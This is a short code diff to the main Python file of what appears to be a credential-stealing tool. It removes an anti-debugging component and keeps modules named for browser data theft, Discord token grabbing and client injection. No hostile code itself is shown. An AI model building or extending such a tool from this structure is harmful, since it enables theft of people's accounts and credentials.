@@ -2,8 +2,6 @@ import logging
 
 import click
 from rich.logging import RichHandler
-
-from components.antidebug import AntiDebug
 from components.browsers import Browsers
 from components.discordtoken import DiscordToken
 from components.injection import Injection
@@ -23,7 +21,6 @@ def main():
     logging.getLogger("rich")
 
     funcs = [
-        AntiDebug,
         Browsers,
         DiscordToken,
         Injection,
